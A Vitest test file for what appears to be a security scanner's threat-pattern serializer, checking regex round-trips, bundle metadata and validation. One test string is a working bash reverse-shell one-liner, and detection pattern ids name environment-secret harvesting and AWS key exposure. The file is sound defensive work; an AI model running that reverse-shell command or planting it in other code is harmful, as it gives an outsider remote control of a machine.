import { describe, it, expect } from 'vitest';
import {
  serializePattern,
  deserializePattern,
  serializeBundle,
  deserializeBundle,
  validateBundle,
} from '../serialize.js';
import { PATTERN_DB } from '../patterns/index.js';
import type { ThreatPattern } from '../types.js';

describe('pattern serialization', () => {
  it('round-trips a simple pattern', () => {
    const pattern: ThreatPattern = {
      id: 'test_pattern',
      category: 'exfiltration',
      severity: 'high',
      name: 'Test pattern',
      description: 'A test',
      regex: /foo\s+bar/,
      fileExtensions: ['js', 'ts'],
    };
    const serialized = serializePattern(pattern);
    expect(serialized.regex).toEqual({ source: 'foo\\s+bar', flags: '' });

    const deserialized = deserializePattern(serialized);
    expect(deserialized.regex.source).toBe(pattern.regex.source);
    expect(deserialized.regex.flags).toBe(pattern.regex.flags);
    expect(deserialized.id).toBe('test_pattern');
  });

  it('preserves regex flags', () => {
    const pattern: ThreatPattern = {
      id: 'flagged',
      category: 'credential_exposure',
      severity: 'high',
      name: 'Flagged',
      description: 'Has flags',
      regex: /secret_key/gi,
      fileExtensions: ['py'],
    };
    const rt = deserializePattern(serializePattern(pattern));
    expect(rt.regex.flags).toBe('gi');
    expect(rt.regex.test('SECRET_KEY')).toBe(true);
  });

  it('round-trips every pattern in PATTERN_DB', () => {
    for (const p of PATTERN_DB) {
      const rt = deserializePattern(serializePattern(p));
      expect(rt.regex.source).toBe(p.regex.source);
      expect(rt.regex.flags).toBe(p.regex.flags);
      expect(rt.id).toBe(p.id);
      expect(rt.category).toBe(p.category);
      expect(rt.severity).toBe(p.severity);
      expect(rt.fileExtensions).toEqual(p.fileExtensions);
    }
  });

  it('deserialized patterns match the same strings as originals', () => {
    const testCases: Array<{ patternId: string; input: string }> = [
      { patternId: 'env_harvest_python', input: 'os.environ["KEY"]' },
      { patternId: 'env_harvest_node', input: 'process.env.SECRET' },
      { patternId: 'reverse_shell_bash', input: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1' },
      { patternId: 'aws_access_key', input: 'AKIAIOSFODNN7EXAMPLE' },
    ];
    for (const tc of testCases) {
      const original = PATTERN_DB.find(p => p.id === tc.patternId);
      if (!original) continue;
      const rt = deserializePattern(serializePattern(original));
      expect(rt.regex.test(tc.input)).toBe(original.regex.test(tc.input));
    }
  });

  it('survives JSON round-trip', () => {
    const pattern: ThreatPattern = {
      id: 'json_rt',
      category: 'obfuscation',
      severity: 'medium',
      name: 'JSON round-trip',
      description: 'Test JSON serialization',
      regex: /eval\s*\([^)]*\)/,
      fileExtensions: ['js'],
    };
    const serialized = serializePattern(pattern);
    const json = JSON.stringify(serialized);
    const parsed = JSON.parse(json);
    const deserialized = deserializePattern(parsed);
    expect(deserialized.regex.test('eval("code")')).toBe(true);
    expect(deserialized.regex.test('console.log()')).toBe(false);
  });
});

describe('bundle serialization', () => {
  it('creates bundle with correct metadata', () => {
    const bundle = serializeBundle('1.0.0', PATTERN_DB);
    expect(bundle.version).toBe('1.0.0');
    expect(bundle.patternCount).toBe(PATTERN_DB.length);
    expect(bundle.patterns).toHaveLength(PATTERN_DB.length);
    expect(bundle.releasedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });

  it('deserializeBundle returns correct array length', () => {
    const bundle = serializeBundle('2.0.0', PATTERN_DB);
    const patterns = deserializeBundle(bundle);
    expect(patterns).toHaveLength(PATTERN_DB.length);
  });

  it('bundle survives full JSON round-trip', () => {
    const bundle = serializeBundle('1.0.0', PATTERN_DB);
    const json = JSON.stringify(bundle);
    const parsed = JSON.parse(json);
    const patterns = deserializeBundle(parsed);
    expect(patterns).toHaveLength(PATTERN_DB.length);
    for (let i = 0; i < patterns.length; i++) {
      expect(patterns[i].regex.source).toBe(PATTERN_DB[i].regex.source);
    }
  });

  it('works with empty pattern list', () => {
    const bundle = serializeBundle('0.0.0', []);
    expect(bundle.patternCount).toBe(0);
    expect(deserializeBundle(bundle)).toHaveLength(0);
  });
});

describe('bundle validation', () => {
  it('validates a correct bundle', () => {
    const bundle = serializeBundle('1.0.0', PATTERN_DB);
    expect(() => validateBundle(bundle)).not.toThrow();
  });

  it('rejects null', () => {
    expect(() => validateBundle(null)).toThrow();
  });

  it('rejects missing version', () => {
    expect(() => validateBundle({ patterns: [], patternCount: 0, releasedAt: '' })).toThrow();
  });

  it('rejects missing patterns array', () => {
    expect(() => validateBundle({ version: '1.0.0', patternCount: 0, releasedAt: '' })).toThrow();
  });

  it('rejects pattern with missing regex', () => {
    expect(() => validateBundle({
      version: '1.0.0', releasedAt: '', patternCount: 1,
      patterns: [{ id: 'x', category: 'a', severity: 'b', name: 'n', description: 'd', fileExtensions: [] }],
    })).toThrow();
  });

  it('rejects pattern with invalid regex shape', () => {
    expect(() => validateBundle({
      version: '1.0.0', releasedAt: '', patternCount: 1,
      patterns: [{
        id: 'x', category: 'a', severity: 'b', name: 'n', description: 'd',
        regex: 'not-an-object', fileExtensions: [],
      }],
    })).toThrow();
  });

  it('rejects invalid category value', () => {
    expect(() => validateBundle({
      version: '1.0.0', releasedAt: '', patternCount: 1,
      patterns: [{
        id: 'x', category: 'not_a_category', severity: 'high', name: 'n', description: 'd',
        regex: { source: 'foo', flags: '' }, fileExtensions: [],
      }],
    })).toThrow();
  });

  it('rejects invalid severity value', () => {
    expect(() => validateBundle({
      version: '1.0.0', releasedAt: '', patternCount: 1,
      patterns: [{
        id: 'x', category: 'exfiltration', severity: 'mega', name: 'n', description: 'd',
        regex: { source: 'foo', flags: '' }, fileExtensions: [],
      }],
    })).toThrow();
  });

  it('deserializeBundle rejects malformed input', () => {
    expect(() => deserializeBundle({ bad: true } as any)).toThrow();
  });
});
